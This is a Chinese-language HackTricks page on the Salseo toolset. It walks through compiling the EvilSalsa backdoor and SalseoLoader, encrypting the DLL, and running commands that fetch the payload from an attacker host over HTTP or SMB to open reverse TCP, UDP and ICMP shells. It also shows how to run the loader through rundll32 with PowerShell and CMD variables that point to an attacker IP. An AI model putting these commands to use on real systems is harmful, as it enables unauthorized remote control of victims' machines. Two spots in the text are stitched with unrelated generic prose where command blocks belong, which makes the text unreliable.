# Salseo

<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 编译二进制文件

从github下载源代码并编译**EvilSalsa**和**SalseoLoader**。您需要安装**Visual Studio**来编译代码。

为您将要使用它们的windows盒子的架构编译这些项目（如果Windows支持x64，为该架构编译它们）。

您可以在Visual Studio的左侧**"Build"标签**中**"Platform Target"**选择架构。

（**如果找不到这个选项，请按**"Project Tab"**然后在**"\<Project Name> Properties"**）

![](<../.gitbook/assets/image (132).png>)

然后，构建两个项目（Build -> Build Solution）（日志中将显示可执行文件的路径）：

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## 准备后门

首先，您需要编码**EvilSalsa.dll**。为此，您可以使用python脚本**encrypterassembly.py**，或者您可以编译项目**EncrypterAssembly**：

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

Windows操作系统是全球最广泛使用的桌面操作系统。由于其普及性，它成为黑客攻击的主要目标之一。在Windows系统中植入后门可以让攻击者长期控制目标系统。

#### Windows后门技术

- **服务**: 通过创建或修改Windows服务，攻击者可以在系统启动时自动执行恶意代码。
- **注册表**: 修改注册表项可以使恶意程序在用户登录时自动运行。
- **Office宏**: 利用Office文档中的宏来执行恶意代码。
- **PowerShell**: 使用PowerShell脚本来执行攻击操作，这种方式难以被传统防病毒软件检测到。
- **WMI事件订阅**: 利用Windows管理工具来持久化和触发恶意活动。

#### 工具和技术

- **Metasploit**: 一个强大的开源渗透测试框架，可以用来开发和执行后门攻击。
- **Empire**: 一个基于PowerShell的后门框架，专门用于Windows系统。
- **Cobalt Strike**: 一款商业渗透测试工具，提供了一系列的后门攻击选项。

#### 防御措施

- **更新**: 定期更新Windows和应用程序来修补安全漏洞。
- **防病毒软件**: 使用可靠的防病毒软件来检测和阻止恶意软件。
- **EDR**: 部署端点检测和响应(EDR)解决方案来监控可疑行为。
- **审计**: 定期审计服务、注册表和计划任务来检查异常配置。
- **访问控制**: 限制用户权限，避免恶意软件获得系统级别的访问权限。

通过了解和应用这些技术和防御措施，可以有效地防止和检测Windows系统中的后门。
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
## **执行后门**

### **获取TCP反向Shell（通过HTTP下载编码的dll）**

记得启动nc作为反向Shell监听器和一个HTTP服务器来提供编码的evilsalsa。
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **获取UDP反向Shell（通过SMB下载编码的dll）**

记得启动nc作为反向Shell监听器，以及一个SMB服务器来提供编码的evilsalsa（impacket-smbserver）。
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **获取 ICMP 反向 shell（已编码的 dll 在受害者内部）**

**这次你需要在客户端下载一个特殊工具来接收反向 shell。下载：** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **禁用 ICMP 回复：**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### 执行客户端：
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### 在受害者内部，执行salseo操作：
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## 将 SalseoLoader 编译为导出 main 函数的 DLL

使用 Visual Studio 打开 SalseoLoader 项目。

### 在 main 函数之前添加：\[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### 为此项目安装 DllExport

#### **工具** --> **NuGet 包管理器** --> **为解决方案管理 NuGet 包...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **搜索 DllExport 包（使用浏览标签），然后按安装（并接受弹出窗口）**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)

在您的项目文件夹中出现了文件：**DllExport.bat** 和 **DllExport\_Configure.bat**

### **卸载** DllExport

按 **卸载**（是的，这很奇怪，但相信我，这是必要的）

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **退出 Visual Studio 并执行 DllExport\_configure**

只需**退出** Visual Studio

然后，转到您的 **SalseoLoader 文件夹** 并**执行 DllExport\_Configure.bat**

选择 **x64**（如果您要在 x64 系统中使用，那是我的情况），选择 **System.Runtime.InteropServices**（在 **DllExport 的命名空间**内）并按 **应用**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **再次使用 Visual Studio 打开项目**

**\[DllExport]** 应不再标记为错误

![](<../.gitbook/assets/image (8) (1).png>)

### 构建解决方案

选择 **输出类型 = 类库**（项目 --> SalseoLoader 属性 --> 应用程序 --> 输出类型 = 类库）

![](<../.gitbook/assets/image (10) (1).png>)

选择 **x64 平台**（项目 --> SalseoLoader 属性 --> 构建 --> 平台目标 = x64）

![](<../.gitbook/assets/image (9) (1) (1).png>)

要**构建**解决方案：构建 --> 构建解决方案（在输出控制台中将显示新 DLL 的路径）

### 测试生成的 Dll

复制并粘贴 Dll 到您想要测试的位置。

执行：
```
rundll32.exe SalseoLoader.dll,main
```
如果没有错误出现，你可能已经有了一个功能性的DLL！

## 使用DLL获取shell

不要忘记使用一个**HTTP** **服务器**并设置一个**nc** **监听器**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

CMD, or Command Prompt, 是Windows操作系统中的一个命令行界面。它允许用户通过输入文本命令来执行操作和运行程序。CMD可以用于多种目的，包括文件管理、系统维护和网络任务。通过CMD，黑客可以执行各种攻击技术，例如植入后门、提取敏感信息和执行远程命令。CMD的灵活性和强大功能使其成为黑客工具箱中的重要组件。
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为英雄，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
